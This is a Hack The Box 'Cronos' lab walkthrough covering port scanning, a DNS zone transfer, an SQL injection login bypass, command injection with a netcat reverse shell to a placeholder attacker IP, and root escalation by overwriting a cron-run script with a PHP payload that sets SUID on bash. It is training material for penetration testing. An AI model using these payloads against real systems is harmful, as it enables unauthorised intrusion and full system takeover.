# Cronos

# 🧠 Hack The Box – Cronos Write-up

## 🎯 Objective

This lab simulates a Linux-based environment exposing multiple network services. The objective is to identify attack vectors across DNS and web services, exploit injection vulnerabilities, and escalate privileges to **root** following a structured penetration testing methodology.

---

## 🛰️ 1. Reconnaissance

The assessment begins with a full TCP port scan to map the attack surface:

```bash
nmap -Pn -n -p- --min-rate 5000 -T4 <IP_TARGET>
```

Open ports identified:

```
22  -> SSH  
53  -> DNS  
80  -> HTTP  
```

A service and version detection scan is then performed:

```bash
nmap -p22,53,80 -sSCV --min-rate 5000 -T4 <IP_TARGET>
```

---

## 🌐 2. DNS Enumeration – Zone Transfer (AXFR)

Since port 53 is exposed, DNS misconfigurations are assessed.

A zone transfer attempt is performed:

```bash
dig axfr @<IP_TARGET> cronos.htb
```

The transfer is successful, revealing an internal subdomain:

```
admin.cronos.htb
```

The discovered subdomain is added to `/etc/hosts` for local resolution:

```bash
sudo nano /etc/hosts
```

---

## 🔐 3. Web Exploitation – SQL Injection

The discovered subdomain hosts a login panel.

A basic SQL injection payload is tested:

```
admin ' OR '1'=1
```

Authentication is successfully bypassed, confirming a **SQL Injection** vulnerability caused by improper input sanitization.

---

## 💣 4. Command Injection & Reverse Shell

After authentication bypass, a vulnerable functionality allows **Command Injection**.

Reverse shell payload:

```bash
8.8.8.8; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

Listener setup on the attacker machine:

```bash
nc -lvnp 4444
```

A reverse shell is successfully obtained.

---

## 🖥️ 5. Shell Stabilization

To improve shell interaction:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

User flag retrieval:

```bash
cd /home/noulis
```

---

## ⏱️ 6. Privilege Escalation – Cron Job Abuse

Scheduled tasks are inspected:

```bash
cat /etc/crontab
```

The following file is executed every minute as **root**:

```
/var/www/laravel/artisan
```

Permissions are checked:

```bash
ls -la /var/www/laravel/artisan
```

The current user has write permissions, creating a privilege escalation vector.

Malicious PHP payload injected:

```bash
echo '<?php system("chmod +s /bin/bash"); ?>' > /var/www/laravel/artisan
```

After the cron execution, the SUID bit is verified:

```bash
ls -la /bin/bash
```

Root shell obtained:

```bash
/bin/bash -p
```

Root flag retrieval:

```bash
cd /root
```

---

## 🧩 Technical Summary

| Phase                 | Technique Used                                 |
| --------------------- | ---------------------------------------------- |
| Reconnaissance        | Full TCP scan with Nmap                        |
| DNS Enumeration       | Zone Transfer (AXFR)                           |
| Initial Access        | SQL Injection                                  |
| Remote Code Execution | Command Injection + Reverse Shell              |
| Privilege Escalation  | Cron Job Abuse (Writable root-executed script) |

---

## 🔎 Skills Demonstrated

* Structured penetration testing methodology
* DNS service enumeration and misconfiguration analysis
* Manual SQL Injection exploitation
* Reverse shell crafting and TTY stabilization
* Linux privilege escalation via scheduled task abuse
* File permission analysis and exploitation

---

## 🏁 Conclusion

Cronos highlights common yet critical misconfigurations found in real-world environments:

* Insecure DNS configuration (zone transfer exposure)
* Lack of input validation (SQLi & Command Injection)
* Excessive file permissions on privileged scheduled tasks

This lab reinforces the importance of secure DNS configuration, proper input validation, and strict privilege management in Linux production environments.

---

For additional professional write-ups focused on technical clarity and recruiter visibility, please refer to the other repositories in this profile.
